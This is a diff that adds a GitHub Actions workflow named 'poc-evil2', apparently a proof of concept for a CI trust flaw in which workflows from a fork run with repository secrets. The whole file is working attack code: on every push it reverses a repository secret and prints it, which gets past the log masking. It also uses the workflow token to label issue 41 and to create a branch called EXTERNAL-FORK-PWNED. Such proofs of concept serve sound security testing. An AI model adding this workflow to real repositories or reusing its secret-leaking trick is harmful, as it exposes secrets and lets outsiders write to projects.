@@ -1,0 +1,24 @@
+name: poc-evil2
+on:
+  push:
+permissions:
+  contents: write
+  pull-requests: write
+jobs:
+  pwn:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          PS: ${{ secrets.POC_SECRET }}
+          TOK: ${{ github.token }}
+          SHA: ${{ github.sha }}
+          REF: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "FORK-EVIL2-RAN repo=$REPO ref=$REF"
+          echo "SECRET_LEN=${#PS}"
+          echo "SECRET_EXFIL_REV=$(printf %s "$PS" | rev)"
+          lw=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" https://api.github.com/repos/$REPO/issues/41/labels -d '{"labels":["FORK-WF-TRUSTED"]}')
+          echo "LABEL_WRITE_HTTP=$lw"
+          br=$(curl -s -o /dev/null -w '%{http_code}' -X POST -H "Authorization: token $TOK" -H "Accept: application/vnd.github+json" https://api.github.com/repos/$REPO/git/refs -d "{\"ref\":\"refs/heads/EXTERNAL-FORK-PWNED\",\"sha\":\"$SHA\"}")
+          echo "CREATE_BRANCH_HTTP=$br"
